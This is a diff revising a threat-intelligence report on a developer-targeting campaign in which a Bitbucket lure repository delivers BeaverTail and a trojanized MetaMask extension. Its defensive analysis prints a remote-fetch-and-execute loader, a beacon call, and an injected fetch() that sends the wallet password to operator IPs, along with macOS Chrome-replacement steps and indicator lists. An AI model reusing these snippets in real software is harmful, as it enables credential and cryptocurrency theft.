@@ -1,10 +1,10 @@
 ---
-title: "Wallet Trap: BeaverTail and Trojanized MetaMask Delivered via Fake Dev Assignment"
+title: "Wallet Trap: BeaverTail and Trojanized MetaMask via Fake Developer Assignment"
 date: 2026-03-24
 author: "ThreatProphet"
-description: "Analysis of a Contagious Interview campaign delivering BeaverTail via a Bitbucket lure repository, culminating in a trojanized MetaMask extension that silently exfiltrates the victim's wallet master password."
+description: "Analysis of a Contagious Interview-aligned campaign delivering BeaverTail via a Bitbucket lure repository, culminating in a trojanized MetaMask extension that exfiltrates the victim's wallet master password."
 tags:
-  - lazarus-group
+  - dprk-linked
   - contagious-interview
   - beavertail
   - metamask
@@ -25,7 +25,11 @@ mitre_techniques:
   - T1059.007
   - T1555.003
   - T1056.002
-  - T1567
+  - T1041
+  - T1048.003
+  - T1115
+  - T1036.005
+  - T1497.001
 report_id: "TP-2026-007"
 showToc: true
 ---
@@ -34,15 +38,25 @@ showToc: true
 
 ## Executive Summary
 
-A threat actor operating a fake recruiter persona on LinkedIn targeted developers with a bogus technical assignment. The lure repository (**mocorex**) was hosted on Bitbucket under the fabricated organisation **fortegroup-org**, impersonating a legitimate DeFi company. The project presented as a standard React/Vite web application, complete with plausible component structure and a commit history spanning multiple apparent contributors. Concealed within it was a heavily horizontally-indented loader, `public/vite.cookie.js`, designed to evade casual code review by pushing malicious content off-screen in any standard file viewer.
+A threat actor operating a fake recruiter persona on LinkedIn targeted developers with a bogus technical assignment. The lure repository (**mocorex**) was hosted on Bitbucket under the fabricated organisation **fortegroup-org**, using a plausible corporate naming pattern rather than a verified legitimate company identity. The project presented as a standard React/Vite web application, complete with plausible component structure and a commit history spanning multiple apparent contributors. Concealed within it was a horizontally indented loader, `public/vite.cookie.js`, designed to evade casual code review by pushing the staging call off-screen in a normal editor viewport. In the preserved sample, the staging call appears on line 529 after 380 leading horizontal whitespace characters.
 
-At runtime, the loader silently fetched a BeaverTail payload from **jsonkeeper.com/b/5SA4R**, a legitimate JSON storage service increasingly exploited by Contagious Interview operators as a staging host. The Stage 2 payload (`cookie` field, consistent with all documented BeaverTail variants) deployed a broad infostealer capability set: host fingerprinting, platform-specific VM detection, persistent clipboard monitoring targeting cryptocurrency wallet addresses, and direct harvesting of 50 hardcoded browser-based crypto wallet extensions across up to 100 Chrome profiles. On macOS, it escalated further into a multi-stage trojanisation chain.
+At runtime, the loader fetched a BeaverTail payload from **jsonkeeper[.]com/b/5SA4R**, a legitimate JSON storage service that has been reported as a staging option in Contagious Interview activity. The Stage 2 payload was delivered through the JSON `cookie` field, consistent with documented JSON-staged BeaverTail delivery patterns, and deployed a broad infostealer capability set: host fingerprinting, platform-specific VM detection, persistent clipboard monitoring targeting cryptocurrency wallet addresses, and direct harvesting of 50 hardcoded browser-based crypto wallet extensions across up to 100 Chrome profiles. On macOS, it escalated further into a multi-stage trojanisation chain.
 
-The macOS chain replaced the victim's **Google Chrome** installation with a malicious build and injected a **pixel-perfect clone of MetaMask 13.16.0** as a sideloaded extension. This component added a targeted credential theft layer on top of the broader infostealer: a single `fetch()` call inserted into MetaMask's password submission handler silently exfiltrated the wallet master password in plaintext to operator infrastructure at `146.70.24.211:4553/api/dech_result` on every unlock attempt, with no visible indication to the victim. The master password decrypts the MetaMask vault, yielding the BIP-39 seed phrase and granting permanent, irrecoverable control over every wallet the victim holds. File exfiltration from harvested wallet and browser data was routed separately to a third C2 host at `184.174.97.8` across two ports, suggesting distinct backend processing pipelines for different data types.
+The macOS chain replaced the victim's **Google Chrome** installation with a malicious build and deployed a cloned **MetaMask 13.16.0** extension as a sideloaded component. This component added a targeted credential theft layer on top of the broader infostealer: a single `fetch()` call inserted into MetaMask's password submission handler sent the wallet master password in plaintext to operator infrastructure at `146.70.24[.]211:4553/api/dech_result` during unlock handling. Where the attacker also possesses the relevant MetaMask vault material, the password can be used to decrypt the vault and recover the seed phrase or private-key material for wallets derived from it. File exfiltration from harvested wallet and browser data was routed separately to a third C2 host at `184.174.97[.]8` across two ports, suggesting distinct backend processing pipelines for different data types.
 
-Three distinct C2 IPs were extracted across the payload stages: `45.61.130.84` (beacon and logging), `146.70.24.211` (payload delivery and password exfiltration), and `184.174.97.8` (file exfiltration, ports 4556 and 4558). All three share a hardcoded campaign UID of `a3c65c2974270fd093ee8a9bf8ae7d0b`, enabling cross-victim correlation. Notably, `184.174.97.8` was not recoverable via string decoding alone; the IP was constructed entirely from numeric hex constants assembled at runtime, bypassing string-based static analysis. Infrastructure fingerprinting of `45.61.130.84` leaked a Windows Server path (`C:\Users\Administrator\Documents\script-server\`) consistent with previously documented Contagious Interview operator infrastructure patterns. TTPs are consistent with **Lazarus Group / Contagious Interview** as documented by NVISO, Microsoft, SANS, and others; attribution is assessed at **medium confidence** based on TTP similarity and infrastructure overlap with published campaigns.
+Three distinct C2 IPs were extracted across the payload stages: `45.61.130[.]84` (beacon and logging), `146.70.24[.]211` (payload delivery and password exfiltration), and `184.174.97[.]8` (file exfiltration, ports 4556 and 4558). All three share a hardcoded campaign UID of `a3c65c2974270fd093ee8a9bf8ae7d0b`, enabling cross-victim correlation. Notably, `184.174.97[.]8` was not recoverable via string decoding alone; the IP was constructed entirely from numeric hex constants assembled at runtime, bypassing string-based static analysis. Infrastructure fingerprinting of `45.61.130[.]84` leaked a Windows Server path (`C:\Users\Administrator\Documents\script-server\`) consistent with previously documented Contagious Interview operator infrastructure patterns. TTPs are consistent with **DPRK-linked Contagious Interview-aligned** activity as documented by multiple vendors; attribution is assessed at **medium confidence** based on lure pattern, malware family, staging technique, and terminal cryptocurrency-theft objective.
 
 ---
+
+## Evidence Basis and Scope
+
+This report is based on preserved repository content, recovered JSONkeeper payload material, decoded BeaverTail strings and runtime-assembled indicators, retrieved macOS payload archives, extracted trojanized MetaMask extension files, Git commit metadata, and C2 probe responses captured during the investigation. The public report does not distribute the private evidence archive. Hashes are included where useful for independent comparison with collected samples, repository mirrors, payload captures, and extracted extension artifacts.
+
+The analysis distinguishes between directly observed evidence and inference:
+
+- directly observed: repository files, execution trigger, JSONkeeper staging response, BeaverTail behavior visible in decoded code, C2 endpoints embedded or constructed by the payload, retrieved DMG/ZIP payloads, and the injected MetaMask `ui-20.js` password-submission hook;
+- inferred: backend role separation between the three C2 IPs and the operator workflow behind the trojanized browser/extension chain;
+- external context: public reporting on Contagious Interview, BeaverTail, JSON-storage staging, and DPRK-linked developer-targeting tradecraft.
 
 ## Attack Overview
 
@@ -54,15 +68,15 @@ The organisation name `fortegroup-org` does not correspond to any identifiable l
 
 ### Kill Chain
 
-1. Victim is contacted on LinkedIn by a fake recruiter and directed to clone `bitbucket.org/fortegroup-org/mocorex`.
-2. Running `npm install` or starting the development server causes the JavaScript runtime to load `public/vite.cookie.js`, a loader disguised as a Vite development utility.
-3. The loader fetches obfuscated BeaverTail JavaScript from `jsonkeeper.com/b/5SA4R` (the `cookie` field) and executes it via `new Function('require', payload)(require)`.
-4. BeaverTail beacons to `45.61.130.84/api/service/process/<uid>` with host profile data (OS, hostname, platform, user info) and a hardcoded campaign UID.
-5. BeaverTail initiates clipboard monitoring (polling every 500ms) and exfiltrates any clipboard changes to `45.61.130.84/api/service/makelog`.
-6. On macOS, BeaverTail downloads an XZ-compressed DMG from `146.70.24.211:4553/api/dd`, kills Google Chrome, renames `/Applications/Google Chrome.app` to `/Applications/tempapp`, and installs the trojanized Chrome in its place.
-7. Concurrently, a ZIP archive is downloaded from `146.70.24.211:4553/api/dm` and extracted to `~/Library/Caches/com.apple.chromo`, a disguised path chosen to blend with legitimate Apple cache directories.
+1. Victim is contacted on LinkedIn by a fake recruiter and directed to clone `bitbucket[.]org/fortegroup-org/mocorex`.
+2. Running Vite-backed project commands causes the JavaScript runtime to load `public/vite.cookie.js`, a loader disguised as a Vite development utility. The preserved `package.json` maps `dev` to `vite --port 8080 --open`, `build` to `vite build`, and `preview` to `vite preview`; those commands load `vite.config.js`, which requires the loader. Plain `npm install` is not confirmed as a standalone execution trigger in the preserved evidence unless paired with instructions or tooling that invokes Vite.
+3. The loader fetches obfuscated BeaverTail JavaScript from `jsonkeeper[.]com/b/5SA4R` (the `cookie` field) and executes it via `new Function('require', payload)(require)`.
+4. BeaverTail beacons to `45.61.130[.]84/api/service/process/<uid>` with host profile data (OS, hostname, platform, user info) and a hardcoded campaign UID.
+5. BeaverTail initiates clipboard monitoring (polling every 500ms) and exfiltrates any clipboard changes to `45.61.130[.]84/api/service/makelog`.
+6. On macOS, BeaverTail downloads an XZ-compressed DMG from `146.70.24[.]211:4553/api/dd`, kills Google Chrome, renames `/Applications/Google Chrome.app` to `/Applications/tempapp`, and installs the trojanized Chrome in its place.
+7. Concurrently, a ZIP archive is downloaded from `146.70.24[.]211:4553/api/dm` and extracted to `~/Library/Caches/com.apple.chromo`, a disguised path chosen to blend with legitimate Apple cache directories.
 8. The trojanized Chrome loads the fake MetaMask extension from `com.apple.chromo` instead of the legitimate installed version.
-9. The next time the victim unlocks MetaMask, their master password is silently exfiltrated via HTTP POST to `146.70.24.211:4553/api/dech_result`.
+9. The next time the victim unlocks MetaMask, their master password is silently exfiltrated via HTTP POST to `146.70.24[.]211:4553/api/dech_result`.
 
 ---
 
@@ -70,33 +84,38 @@ The organisation name `fortegroup-org` does not correspond to any identifiable l
 
 ### Stage 1: Loader (`public/vite.cookie.js`)
 
-The malicious loader is placed in the `public/` directory of the Vite project, ensuring it is served as a static asset and excluded from typical server-side code review. The filename `vite.cookie.js` is chosen to mimic a legitimate Vite development plugin, a naming convention developers working with the framework would find unremarkable.
+The malicious loader is placed in the `public/` directory of the Vite project, a location that can appear benign during superficial frontend review. The filename `vite.cookie.js` is chosen to mimic a legitimate Vite development plugin, a naming convention developers working with the framework would find unremarkable.
 
-The file employs horizontal whitespace obfuscation: the malicious code begins after thousands of leading space characters on a single line, pushing it entirely off-screen in any standard file viewer or code editor without horizontal scroll. This technique has been consistently observed across Contagious Interview lure repositories on both GitHub and Bitbucket since at least 2024.
+The file employs horizontal whitespace obfuscation. The preserved sample is 4,675 bytes across 626 lines. The longest line is line 529, where the JSONkeeper staging request begins after 380 leading horizontal whitespace characters; the `new Function` execution sink appears later in the same loader. This pushes the malicious content outside a normal editor viewport without horizontal scrolling while leaving a benign-looking `console.log("Loading cookie data...")` at the visible top of the file.
 
 **Execution trigger: `vite.config.js`**
 
-The loader is not self-executing. A separate commit (`275d524`, authored by `dnaleor@gmail.com`, 2026-03-02) introduced a `vite.config.js` that wires up execution with a single `require` call:
+The loader is not self-executing. The preserved project scripts confirm that Vite-backed commands load the configuration and trigger the malicious require path:
 
-```javascript
-// https://vitejs.dev/config/
-module.exports = defineConfig(async ({ mode }) => {
-  const plugins = [react()];
-  // https://vitejs.dev/config/
-  require('./public/vite.cookie');   // ← malicious execution trigger
-  // Only load componentTagger in development mode using dynamic import
-  if (mode === "development") {
-    try {
-      const { componentTagger } = await import("lovable-tagger");
-      plugins.push(componentTagger());
-    } catch (error) { ... }
-  }
-  ...
+```text
+dev: vite --port 8080 --open
+build: vite build
+lint: eslint .
+preview: vite preview
 ```
 
-The call is placed at the top level of the config module outside any conditional block, so it executes unconditionally whenever Vite loads the config — on `npm run dev`, `npm run build`, or any other Vite command. It is sandwiched between two legitimate `// https://vitejs.dev/config/` comments, blending visually into standard boilerplate.
+The final `vite.config.js` contains the trigger at line 9:
 
-The presence of `lovable-tagger` — a real dependency used by the Lovable.dev AI project generator — indicates the lure repository was scaffolded using an AI code generation tool to produce a convincing codebase quickly, with the malicious `require` line then injected into the generated config.
+```javascript
+const { defineConfig } = require("vite");
+const react = require("@vitejs/plugin-react-swc");
+const path = require("path");
+
+module.exports = defineConfig(async ({ mode }) => {
+  require('./public/vite.cookie');
+  // Only load componentTagger in development mode using dynamic import
+  ...
+});
+```
+
+The call is placed at the top level of the config module, outside any conditional block, so it executes whenever Vite loads the config. This includes `npm run dev`, `npm run build`, and `npm run preview`; `npm run lint` does not load Vite and is not an execution trigger based on the preserved scripts.
+
+The repository history contains multiple persona-style authors. The preserved HEAD is merge commit `31ea638fde20a03052b46490faa3e7e431ac6f8f`, authored by `Fabian <Fabian@chainsquad.com>` on 2026-03-02, with subject `Merge branch 'dnaleor' into main`. Author identities should therefore be treated as repository persona artifacts for clustering, not as reliable real-world identity indicators.
 
 **Payload fetch and execution**
 
@@ -104,16 +123,16 @@ At runtime, the loader fetches its payload from the JSONkeeper staging URL and e
 
 ```javascript
 // Reconstructed loader logic (simplified)
-fetch("https://jsonkeeper.com/b/5SA4R")
+fetch("hxxps://jsonkeeper[.]com/b/5SA4R")
   .then(r => r.json())
   .then(d => new Function('require', d.cookie)(require));
 ```
 
-The `cookie` key name in the JSON response is a documented BeaverTail signature, consistent across all variants reported by NVISO (November 2025), Microsoft (March 2026), and independent researchers.
+The `cookie` key name in the JSON response is consistent with JSON-staged BeaverTail delivery described in public reporting. It should be treated as a payload-family indicator when combined with the decoded code behavior, not as a sufficient standalone family signature.
 
 ### Stage 2: BeaverTail Payload
 
-The Stage 2 payload retrieved from `jsonkeeper.com/b/5SA4R` is a heavily obfuscated BeaverTail variant. Obfuscation is implemented via a custom multi-alphabet base-encoding scheme: a constant lookup table (`uQH0eUH`) replaces all numeric literals, and all string literals are stored in a single encoded array (`_94vf9`) decoded at runtime by one of six independent decoder functions, each using a distinct scrambled alphabet string. This per-block alphabet variation is a deliberate anti-signature technique introduced in the October 2025 BeaverTail update documented by Microsoft, designed to defeat YARA rules that rely on a fixed decoder pattern.
+The Stage 2 payload retrieved from `jsonkeeper[.]com/b/5SA4R` is a heavily obfuscated BeaverTail variant. Obfuscation is implemented via a custom multi-alphabet base-encoding scheme: a constant lookup table (`uQH0eUH`) replaces all numeric literals, and all string literals are stored in a single encoded array (`_94vf9`) decoded at runtime by one of six independent decoder functions, each using a distinct scrambled alphabet string. This per-block alphabet variation is consistent with anti-signature hardening observed in newer BeaverTail reporting and reduces the utility of static rules that rely on one fixed decoder pattern.
 
 A self-nullifying no-op function (`vlQxR3`) overwrites itself on first call, preventing re-execution and complicating dynamic analysis. Multiple redundant `try/catch` blocks each embed an independent decoder instance, providing resilience against parse-time errors in sandboxed environments.
 
@@ -123,7 +142,7 @@ Static extraction of the decoded string array revealed the full capability set:
 
 ```javascript
 // Victim registration beacon
-axios.post("http://45.61.130.84/api/service/process/" + uid, {
+axios.post("hxxp://45.61.130[.]84/api/service/process/" + uid, {
   OS: os.type(),
   platform: os.platform(),
   release: os.release() + (isVM ? " (VM)" : "(Local)"),
@@ -138,7 +157,7 @@ The campaign UID `a3c65c2974270fd093ee8a9bf8ae7d0b` is hardcoded across all stag
 
 **Anti-static-analysis: numeric constant IP assembly**
 
-A third C2 IP (`184.174.97.8`) was not stored as a string anywhere in the payload and was therefore not recoverable by the string decoder alone. Instead, the IP was constructed entirely from hex integer constants and a separator character fetched from the `uQH0eUH` lookup table:
+A third C2 IP (`184.174.97[.]8`) was not stored as a string anywhere in the payload and was therefore not recoverable by the string decoder alone. Instead, the IP was constructed entirely from hex integer constants and a separator character fetched from the `uQH0eUH` lookup table:
 
 ```javascript
 // IP octets as hex integer constants
@@ -152,7 +171,7 @@ const X9gtI3O = "" + qAe1Vp  + uQH0eUH[0x12]
                    + qUGwra  + uQH0eUH[0x12]
                    + nwDAQSn + uQH0eUH[0x12]
                    + cFpXnq;
-// → "184.174.97.8"
+// → "184.174.97[.]8"
 
 // Ports as hex integer literals
 const cY0l18Q = 0x11cc;  // 4556
@@ -164,14 +183,14 @@ The assembled variables (`X9gtI3O`, `cY0l18Q`, `dely_ky`) were then injected int
 ```javascript
 // Process 2 and 3 spawn payload
 const uu = "http://" + X9gtI3O + ":" + cY0l18Q + "/upload";
-// → "http://184.174.97.8:4556/upload"
+// → "hxxp://184.174.97[.]8:4556/upload"
 
 // Process 4 spawn payload  
 const uu = "http://" + X9gtI3O + ":" + dely_ky + "/upload";
-// → "http://184.174.97.8:4558/upload"
+// → "hxxp://184.174.97[.]8:4558/upload"
 ```
 
-The two ports likely correspond to different exfiltration process branches, with harvested file uploads routed to separate receiver instances on the same host, possibly to separate victim queues on the operator's backend.
+The two ports indicate at least two separate upload branches on the same host. Any backend separation by data type or victim queue remains an inference unless corroborated by server-side evidence.
 
 **VM detection:** Before proceeding, BeaverTail performs active environment checks across all three supported platforms:
 
@@ -181,9 +200,9 @@ The two ports likely correspond to different exfiltration process branches, with
 | macOS | `system_profiler SPHardwareDataType` | `/vmware\|virtualbox\|qemu\|parallels\|virtual/i` |
 | Linux | `readFileSync('/proc/cpuinfo')` | `hypervisor`, `vmware`, `virtualbox`, `qemu`, `kvm`, `xen`, `parallels`, `bochs` |
 
-If a VM is detected, the operator is notified via the `(VM)` suffix appended to the OS release string in the beacon, but execution continues. This is consistent with operator tradecraft that marks sandboxed victims for filtering without alerting them.
+If a VM is detected, the operator is notified via the `(VM)` suffix appended to the OS release string in the beacon, but execution continues. This supports the assessment that sandboxed or virtualized hosts can be labelled for later filtering without necessarily halting execution.
 
-**Clipboard monitoring:** A `setInterval` loop polls the clipboard every 500ms using platform-native commands (`pbpaste` on macOS, `powershell Get-Clipboard` on Windows). Any change is debounced 500ms and exfiltrated to the makelog endpoint. This capability is specifically designed to intercept cryptocurrency wallet addresses copied for transaction signing.
+**Clipboard monitoring:** A `setInterval` loop polls the clipboard every 500ms using platform-native commands (`pbpaste` on macOS, `powershell Get-Clipboard` on Windows). Any change is debounced 500ms and exfiltrated to the makelog endpoint. This capability is well suited to intercepting cryptocurrency wallet addresses copied during transaction workflows.
 
 **Wallet extension harvesting:** Fifty browser extension IDs are hardcoded, covering every major cryptocurrency wallet available as a Chrome extension. The payload iterates up to 100 Chrome user profiles, reads `Preferences` and `Secure Preferences` for each, enables developer mode (`extensions.ui.developer_mode = true`), and uses a deterministic machine ID to decrypt `Secure Preferences`, extracting encrypted vault data directly from the browser profile filesystem.
 
@@ -191,17 +210,17 @@ If a VM is detected, the operator is notified via the `(VM)` suffix appended to 
 
 On macOS, BeaverTail executes the following sequence after a 3-second initial delay:
 
-1. Downloads XZ-compressed DMG from `146.70.24.211:4553/api/dd` to a temporary path.
+1. Downloads XZ-compressed DMG from `146.70.24[.]211:4553/api/dd` to a temporary path.
 2. Kills the running Google Chrome process via `killall -9 "Google Chrome"`.
 3. Renames `/Applications/Google Chrome.app` to `/Applications/tempapp` (preserving the legitimate binary as cover).
 4. Mounts the DMG via `hdiutil attach` and installs the contained `.app` bundle to `/Applications`, replacing Chrome.
 5. Deletes the DMG.
 
-The trojanized Chrome installs silently and appears identical to the legitimate application in all respects.
+The trojanized Chrome is installed in place of the legitimate application. Visual similarity should be assessed from preserved binaries and UI behavior; this report does not rely on user-interface similarity as an attribution indicator.
 
 ### Stage 3b: Trojanized MetaMask Extension
 
-Concurrently, a ZIP archive downloaded from `146.70.24.211:4553/api/dm` is extracted to `~/Library/Caches/com.apple.chromo`. This archive contains a complete MetaMask 13.16.0 extension (1,446 files) with a single surgical modification. File timestamps reveal the operator's precise changes:
+Concurrently, a ZIP archive downloaded from `146.70.24[.]211:4553/api/dm` is extracted to `~/Library/Caches/com.apple.chromo`. This archive contains a cloned MetaMask 13.16.0 extension tree with a targeted modification identified in `ui-20.js`. The extracted manifest identifies the extension as MetaMask, manifest version 3, minimum Chrome version 115, and version `13.16.0`. File timestamps reveal the operator's precise changes:
 
 | Timestamp | Files | Nature |
 |---|---|---|
@@ -219,7 +238,7 @@ S(this, "handleSubmit", async e => {
   const { password: t } = this.state;
 
   // Exfiltrate password before unlock
-  fetch("http://146.70.24.211:4553/api/dech_result", {
+  fetch("hxxp://146.70.24[.]211:4553/api/dech_result", {
     method: "POST",
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
@@ -232,18 +251,18 @@ S(this, "handleSubmit", async e => {
   // Legitimate MetaMask unlock logic continues normally...
 ```
 
-The MetaMask UI behaves entirely normally after this call. The victim sees no error, no latency, and no visual indication that their password has been transmitted. The master password decrypts the MetaMask vault, yielding the BIP-39 seed phrase and granting the operator permanent, irrecoverable control over every wallet derived from it.
+The injected call occurs before the legitimate unlock logic continues. No explicit user-facing warning is visible in the injected code path. If the attacker obtains the corresponding vault material, the captured master password can be used to decrypt MetaMask wallet data and recover seed or private-key material.
 
 ### C2 Infrastructure Fingerprint
 
-Probing `45.61.130.84` on port 80 returned a 404 error page that leaked an Express.js server path:
+Probing `45.61.130[.]84` on port 80 returned a 404 error page that leaked an Express.js server path:
 
 ```
 Error: ENOENT: no such file or directory,
 stat 'C:\Users\Administrator\Documents\script-server\client\build\index.html'
 ```
 
-This confirms a Windows Server host running an Express.js application referred to internally as `script-server`, consistent with the web-based C2 panel architecture documented in prior Contagious Interview infrastructure analyses.
+This indicates a Windows-hosted Express.js application using a `script-server` directory layout. It is a useful infrastructure fingerprint, but not sufficient by itself for attribution.
 
 ---
 
@@ -251,19 +270,19 @@ This confirms a Windows Server host running an Express.js application referred t
 
 | Technique ID | Name | Tactic | Notes |
 |---|---|---|---|
-| T1566.003 | Spearphishing via Service | Initial Access | LinkedIn fake recruiter lure |
-| T1204.002 | Malicious File | Execution | `npm install` / dev server start triggers loader |
-| T1027 | Obfuscated Files or Information | Defense Evasion | Horizontal whitespace in `vite.cookie.js`; multi-alphabet encoding in BeaverTail |
-| T1105 | Ingress Tool Transfer | Command and Control | JSONkeeper fetch of Stage 2; C2 downloads of Stage 3 DMG and ZIP |
-| T1059.007 | JavaScript | Execution | `new Function('require', payload)(require)` RCE primitive |
-| T1555.003 | Credentials from Web Browsers | Credential Access | MetaMask vault decryption via browser profile filesystem |
-| T1056.002 | GUI Input Capture | Credential Access | Trojanized MetaMask intercepts master password at unlock |
-| T1115 | Clipboard Data | Collection | 500ms clipboard polling via `pbpaste` / `powershell Get-Clipboard` |
-| T1036.005 | Match Legitimate Name or Location | Defense Evasion | `public/vite.cookie.js`; `~/Library/Caches/com.apple.chromo` |
-| T1567 | Exfiltration Over Web Service | Exfiltration | Password and clipboard data exfiltrated over plain HTTP |
-| T1497.001 | Virtualization/Sandbox Evasion | Defense Evasion | Active VM detection across Windows, macOS, Linux |
-
----
+| T1566.003 | Spearphishing via Service | Initial Access | LinkedIn recruiter lure and technical-assignment delivery |
+| T1204.002 | User Execution: Malicious File | Execution | Victim runs Vite-backed project commands that load the malicious config-triggered loader |
+| T1059.007 | Command and Scripting Interpreter: JavaScript | Execution | `new Function('require', payload)(require)` executes the JSONkeeper-delivered JavaScript payload |
+| T1059.004 | Unix Shell | Execution | macOS chain uses shell tooling such as `killall` and `hdiutil` during Chrome replacement |
+| T1027 | Obfuscated Files or Information | Defense Evasion | Horizontal whitespace concealment in `vite.cookie.js`; multi-alphabet BeaverTail encoding; runtime-assembled IP address |
+| T1105 | Ingress Tool Transfer | Command and Control | JSONkeeper BeaverTail fetch; DMG and ZIP retrieval from operator infrastructure |
+| T1555.003 | Credentials from Web Browsers | Credential Access | Browser and wallet-extension profile data targeted, including MetaMask-related material |
+| T1056.002 | Input Capture: GUI Input Capture | Credential Access | Trojanized MetaMask unlock handler captures submitted master password |
+| T1115 | Clipboard Data | Collection | Clipboard polling via `pbpaste` and PowerShell clipboard access |
+| T1036.005 | Masquerading: Match Legitimate Name or Location | Defense Evasion | `public/vite.cookie.js`, `~/Library/Caches/com.apple.chromo`, and Chrome/MetaMask replacement artifacts mimic legitimate locations/components |
+| T1497.001 | Virtualization/Sandbox Evasion: System Checks | Defense Evasion | VM/sandbox checks across Windows, macOS, and Linux label execution environment |
+| T1041 | Exfiltration Over C2 Channel | Exfiltration | Host data, clipboard data, and password material sent to operator-controlled endpoints |
+| T1048.003 | Exfiltration Over Unencrypted Non-C2 Protocol | Exfiltration | Plain HTTP upload endpoints on non-standard ports, including file-exfiltration branches |
 
 ## Infrastructure Analysis
 
@@ -271,25 +290,29 @@ This confirms a Windows Server host running an Express.js application referred t
 
 | Indicator | Type | Notes |
 |---|---|---|
-| `45.61.130.84` | IPv4 | C2 - victim registration and makelog beacon; Express.js; Windows Server |
-| `146.70.24.211` | IPv4 | C2 - Stage 3 payload delivery and password exfiltration; port 4553 |
-| `jsonkeeper.com/b/5SA4R` | URL | Stage 2 BeaverTail staging - JSONkeeper (new, undocumented endpoint) |
-| `45.61.130.84/api/service/process/<uid>` | URL | Victim registration endpoint |
-| `45.61.130.84/api/service/makelog` | URL | Logging/clipboard exfiltration endpoint |
-| `146.70.24.211:4553/api/dd` | URL | Trojanized Chrome DMG download |
-| `146.70.24.211:4553/api/dm` | URL | Trojanized MetaMask ZIP download |
-| `146.70.24.211:4553/api/dech_result` | URL | MetaMask password exfiltration endpoint |
-| `184.174.97.8` | IPv4 | C2 - file exfiltration server; ports 4556 and 4558; IP assembled from numeric constants at runtime |
-| `184.174.97.8:4556/upload` | URL | File exfiltration - Process 2/3 branch |
-| `184.174.97.8:4558/upload` | URL | File exfiltration - Process 4 branch |
+| `45.61.130[.]84` | IPv4 | C2 - victim registration and makelog beacon; Express.js; Windows Server |
+| `146.70.24[.]211` | IPv4 | C2 - Stage 3 payload delivery and password exfiltration; port 4553 |
+| `184.174.97[.]8` | IPv4 | C2 - file exfiltration server; ports 4556 and 4558; IP assembled from numeric constants at runtime |
+| `jsonkeeper[.]com/b/5SA4R` | URL | Stage 2 BeaverTail staging - JSONkeeper |
+| `45.61.130[.]84/api/service/process/<uid>` | URL | Victim registration endpoint |
+| `45.61.130[.]84/api/service/makelog` | URL | Logging/clipboard exfiltration endpoint |
+| `146.70.24[.]211:4553/api/dd` | URL | Trojanized Chrome DMG/XZ download |
+| `146.70.24[.]211:4553/api/dm` | URL | Trojanized MetaMask ZIP download |
+| `146.70.24[.]211:4553/api/dech_result` | URL | MetaMask password exfiltration endpoint |
+| `146.70.24[.]211:4553/api/uspf` | URL | Additional observed endpoint in payload-derived IOC extraction; function not independently confirmed |
+| `146.70.24[.]211:4553/upload` | URL | Additional observed upload endpoint; function not independently confirmed |
+| `184.174.97[.]8:4556/upload` | URL | File exfiltration - Process 2/3 branch |
+| `184.174.97[.]8:4558/upload` | URL | File exfiltration - Process 4 branch |
+| `api[.]mocorex[.]com/api` | Domain/path | Lure application API reference, not classified as malware C2 without additional evidence |
 
 ### Repository Infrastructure
 
 | Indicator | Type | Notes |
 |---|---|---|
-| `bitbucket.org/fortegroup-org/mocorex` | Repository | Primary lure repository |
+| `bitbucket[.]org/fortegroup-org/mocorex` | Repository | Primary lure repository |
 | `fortegroup-org` | Bitbucket account | Fabricated organisation |
 | `public/vite.cookie.js` | File path | Stage 1 loader - horizontal whitespace obfuscation |
+| `31ea638fde20a03052b46490faa3e7e431ac6f8f` | Commit | Preserved repository HEAD, merge of `dnaleor` branch into `main` |
 
 ---
 
@@ -301,22 +324,38 @@ This confirms a Windows Server host running an Express.js application referred t
 
 | Indicator | Type | Confidence |
 |---|---|---|
-| `45.61.130.84` | IPv4 | High |
-| `146.70.24.211` | IPv4 | High |
-| `184.174.97.8` | IPv4 | High - assembled from numeric constants; not recoverable via string decoding |
+| `45.61.130[.]84` | IPv4 | High |
+| `146.70.24[.]211` | IPv4 | High |
+| `184.174.97[.]8` | IPv4 | High - assembled from numeric constants; not recoverable via string decoding |
 | `jsonkeeper[.]com/b/5SA4R` | URL | High |
+| `hxxp://45.61.130[.]84/api/service/process/a3c65c2974270fd093ee8a9bf8ae7d0b` | URL | High - campaign UID-specific registration path |
+| `hxxp://45.61.130[.]84/api/service/makelog` | URL | High |
+| `hxxp://146.70.24[.]211:4553/api/dd` | URL | High |
+| `hxxp://146.70.24[.]211:4553/api/dm` | URL | High |
+| `hxxp://146.70.24[.]211:4553/api/dech_result` | URL | High |
+| `hxxp://184.174.97[.]8:4556/upload` | URL | High |
+| `hxxp://184.174.97[.]8:4558/upload` | URL | High |
 | `a3c65c2974270fd093ee8a9bf8ae7d0b` | Campaign UID | High - hardcoded in all payload stages |
 
-### File Indicators
+### File and Payload Hashes
 
-| Hash (SHA256) | Filename | Notes |
-|---|---|---|
-| *(retrieve from manifest)* | `public/vite.cookie.js` | Stage 1 loader, mocorex HEAD |
-| *(retrieve from manifest)* | `stage2-payload-raw.json` | BeaverTail, retrieved from JSONkeeper 2026-03-23 |
-| *(retrieve from manifest)* | `stage3-dmg-*.bin` | Trojanized Chrome DMG (XZ), retrieved 2026-03-23 |
-| *(retrieve from manifest)* | `stage3-dm-clean-*.bin` | Trojanized MetaMask ZIP, retrieved 2026-03-23 |
-| *(retrieve from manifest)* | `stage3-metamask-ui20.js` | MetaMask `ui-20.js` with injected password exfil |
-| *(retrieve from manifest)* | `stage3-metamask-manifest.json` | Trojanized extension manifest (MetaMask 13.16.0) |
+Hashes are included for independent comparison with collected samples, repository mirrors, payload captures, and extracted extension artifacts. The private evidence archive is not distributed with this report.
+
+| SHA256 | Description |
+|---|---|
+| `3538dca5a5eeb50d26b9ee7c6ad0ea5a63af4fe49b7c9aa242a7b06dce34501d` | `public/vite.cookie.js` - Stage 1 loader, mocorex HEAD |
+| `52b3f9eeda915ff2e64687f31c2b095dd83e95d19097de619ff956a1e8a5419c` | `vite.config.js` - execution trigger containing `require('./public/vite.cookie')` |
+| `3dd949a7a16db7d6f1a677f6c8abeeca2695e4e95cb6174b69b0e71dcf570bbc` | Stage 2 payload capture with headers - BeaverTail retrieved from JSONkeeper, 2026-03-23 |
+| `0ca3a74ac972080a2f7a915044abd81d95338afde17aeae26af6f7a31c16e3ec` | Stage 2 payload capture, second probe - JSONkeeper, 2026-03-23 |
+| `5f69913d6292ae9b879536ab8c08c9938ffbed352733ae7896f06d4ab09208cc` | Stage 2 payload body - BeaverTail JSON body |
